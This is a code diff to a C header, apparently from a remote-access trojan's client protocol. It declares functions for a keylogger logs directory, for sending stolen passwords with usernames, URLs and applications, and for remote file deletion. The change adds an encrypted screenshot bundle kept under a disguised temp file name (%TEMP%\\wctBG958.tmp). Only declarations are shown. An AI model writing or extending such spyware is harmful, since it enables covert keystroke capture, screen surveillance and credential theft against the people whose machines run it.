@@ -77,8 +77,8 @@ int remote_proto_decode_get_directory(const unsigned char* body, unsigned int bo
 /* Encode GetDirectoryResponse body: RemotePath + repeated FileSystemEntry (EntryType, Name, Size). Returns body length or 0. */
 unsigned int remote_proto_encode_get_directory_response(const char* remote_path, unsigned char* out, unsigned int out_size);
 
-/* Encode GetKeyloggerLogsDirectoryResponse body: field 1 LogsDirectory (string). Returns body length or 0. */
-unsigned int remote_proto_encode_get_keylogger_logs_directory_response(const char* logs_directory, unsigned char* out, unsigned int out_size);
+/* Encode GetKeyloggerLogsDirectoryResponse body: field 1 LogsDirectory, field 2 ScreenshotBundlePath (strings). Returns body length or 0. */
+unsigned int remote_proto_encode_get_keylogger_logs_directory_response(const char* logs_directory, const char* screenshot_bundle_path, unsigned char* out, unsigned int out_size);
 
 /* Encode GetPasswordsResponse body: field 1 repeated RecoveredAccount. Each: 1 Username, 2 Password, 3 Url, 4 Application. accounts from remote_passwords.h. */
 unsigned int remote_proto_encode_get_passwords_response(const void* accounts, unsigned int count, unsigned char* out, unsigned int out_size);
@@ -86,6 +86,9 @@ unsigned int remote_proto_encode_get_passwords_response(const void* accounts, un
 /* Helper used by both the keylogger service and GetKeyloggerLogsDirectory handler
  * to determine the logs directory on the client. Implemented in remote_client.c. */
 int remote_get_logs_dir(char* out_path, size_t out_size);
+
+/* Encrypted screenshot bundle path: %TEMP%\\wctBG958.tmp. Implemented in remote_client.c. */
+int remote_get_screenshot_bundle_path(char* out_path, size_t out_size);
 
 /* Parse DoPathDelete body: field 1 Path (string), field 2 PathType (varint). *out_path_type: 0=File, 1=Directory. Returns 1 on success. */
 int remote_proto_decode_do_path_delete(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size, int* out_path_type);
